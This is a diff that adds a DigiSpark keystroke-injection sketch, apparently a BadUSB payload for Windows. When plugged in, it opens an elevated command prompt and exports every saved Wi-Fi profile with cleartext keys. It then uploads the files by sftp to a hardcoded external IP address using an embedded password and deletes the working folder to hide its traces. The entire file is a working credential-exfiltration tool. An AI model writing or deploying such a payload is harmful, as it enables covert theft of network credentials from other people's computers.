@@ -1,0 +1,71 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+    // clear
+    DigiKeyboard.sendKeyStroke(0);
+
+    // press and release windows key
+    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
+    // Search for command prompt
+    DigiKeyboard.print("cmd");
+    DigiKeyboard.delay(500);
+    DigiKeyboard.sendKeyStroke(0);
+    // Press shift, control, and enter at the same time!!!
+    DigiKeyboard.sendKeyPress(40, MOD_SHIFT_RIGHT | MOD_CONTROL_LEFT);
+    //DigiKeyboard.delay(1000);
+    DigiKeyboard.sendKeyStroke(0,0);
+    DigiKeyboard.delay(500);
+    
+    // uncomment the following out depending on the system config
+    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+    DigiKeyboard.sendKeyStroke(40);
+    DigiKeyboard.delay(500);
+    
+    // cd into C drive
+    DigiKeyboard.println("cd  C:\\");
+    DigiKeyboard.delay(100);
+    // wait for directory to be entered
+    DigiKeyboard.delay(10);
+    // create directory
+    DigiKeyboard.println("md l");
+    DigiKeyboard.delay(10);
+    // enter dir and get wifi profiles
+    DigiKeyboard.println("cd l && @netsh wlan export profile key=clear >nul");
+    DigiKeyboard.delay(1200);
+    // connect to sftp server
+    DigiKeyboard.println("sftp -oPort=22 test@34.73.40.215");
+  
+    // For first time connection. Needs to add fingerprint to known/trusted hosts
+    //DigiKeyboard.delay(2000);
+    //cmdDigiKeyboard.println("yes");
+    
+    // wait for connection
+    DigiKeyboard.delay(2000);
+    // enter password
+    DigiKeyboard.println("QF\\I.JGs!QzC+f=;W2xc)(7=HfSstOa-_?$rd[7[A'[DV&E9\\N;2K1$");
+    DigiKeyboard.delay(2000);
+    // multiple file upload uses mput command
+    DigiKeyboard.println("mput C:\\l\\*.xml");
+    DigiKeyboard.delay(3000);
+    // exit sftp session
+    DigiKeyboard.println("bye");
+    DigiKeyboard.delay(300);
+    DigiKeyboard.println("cd ..");
+    DigiKeyboard.delay(10);
+    DigiKeyboard.println("del \"C:\\l\"");
+    DigiKeyboard.delay(600);
+    // confirm delete
+    DigiKeyboard.println("Y");
+    DigiKeyboard.delay(100);
+    DigiKeyboard.println("rmdir l");
+    DigiKeyboard.delay(600);
+    DigiKeyboard.println("exit");
+
+  
+  
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
